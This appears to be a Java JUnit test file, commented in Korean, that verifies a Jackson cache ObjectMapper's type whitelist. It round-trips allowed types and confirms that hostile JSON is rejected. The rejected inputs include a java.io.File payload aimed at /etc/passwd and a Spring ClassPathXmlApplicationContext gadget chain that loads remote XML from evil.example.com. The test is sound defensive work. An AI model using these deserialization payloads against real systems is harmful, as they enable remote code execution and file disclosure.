package com.personal.marketnote.user.configuration;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.exc.InvalidTypeIdException;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.datatype.hibernate5.jakarta.Hibernate5JakartaModule;
import com.fasterxml.jackson.datatype.jdk8.Jdk8Module;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import com.personal.marketnote.user.adapter.out.hibernate.HibernateCollectionMixIn;
import com.personal.marketnote.user.domain.user.Nickname;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * CacheConfig ObjectMapper 직렬화/역직렬화 왕복 테스트.
 * <p>
 * PolymorphicTypeValidator 화이트리스트(#4856) 적용 후 라운드트립이 정상 동작하는지,
 * 화이트리스트 외 패키지는 InvalidTypeIdException을 일으키는지 검증한다.
 */
class CacheConfigObjectMapperTest {

    private ObjectMapper createCacheObjectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.activateDefaultTyping(
                BasicPolymorphicTypeValidator.builder()
                        .allowIfSubType("com.personal.marketnote.")
                        .allowIfSubType("java.util.")
                        .allowIfSubType("java.time.")
                        .allowIfSubType("java.math.")
                        .allowIfSubType("java.lang.")
                        .build(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY
        );
        mapper.registerModule(new Jdk8Module());
        mapper.registerModule(new Hibernate5JakartaModule());
        mapper.registerModule(new JavaTimeModule());
        mapper.addMixIn(Collection.class, HibernateCollectionMixIn.class);
        return mapper;
    }

    @Test
    @DisplayName("Nickname VO(@JsonCreator/@JsonValue) 라운드트립이 성공한다 (com.personal.marketnote. 화이트리스트 통과)")
    void nickname_shouldRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        Nickname nickname = Nickname.of("홍길동01");

        // when
        String json = mapper.writeValueAsString(nickname);
        Object deserialized = mapper.readValue(json, Object.class);

        // then - @JsonValue 로 String 직렬화되므로 String으로 복원됨
        assertThat(deserialized).isInstanceOf(String.class);
        assertThat(deserialized).isEqualTo("홍길동01");
    }

    @Test
    @DisplayName("ArrayList<String> 라운드트립이 성공한다 (java.util. + java.lang. 화이트리스트 통과)")
    void stringArrayList_shouldRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<String> list = new ArrayList<>(List.of("a", "b", "c"));

        // when
        String json = mapper.writeValueAsString(list);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> resultList = (List<?>) deserialized;
        assertThat(resultList).hasSize(3);
        assertThat(resultList).isEqualTo(List.of("a", "b", "c"));
    }

    @Test
    @DisplayName("BigDecimal/LocalDateTime 라운드트립이 성공한다 (java.math/java.time 화이트리스트 통과)")
    void bigDecimalAndLocalDateTime_shouldRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<Object> mixed = new ArrayList<>();
        mixed.add(BigDecimal.valueOf(12345.67));
        mixed.add(LocalDateTime.of(2026, 4, 25, 12, 0));

        // when
        String json = mapper.writeValueAsString(mixed);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> resultList = (List<?>) deserialized;
        assertThat(resultList.get(0)).isInstanceOf(BigDecimal.class);
        assertThat(resultList.get(1)).isInstanceOf(LocalDateTime.class);
    }

    @Test
    @DisplayName("화이트리스트 외 패키지 클래스(com.example.evil.Foo)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void unwhitelistedPackage_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson = "[\"com.example.evil.Foo\",{\"x\":1}]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("화이트리스트 외 표준 라이브러리(java.io.File)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void javaIoFile_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson = "[\"java.io.File\",\"/etc/passwd\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("알려진 가젯 체인(ClassPathXmlApplicationContext)은 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void springGadgetChain_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson =
                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }
}
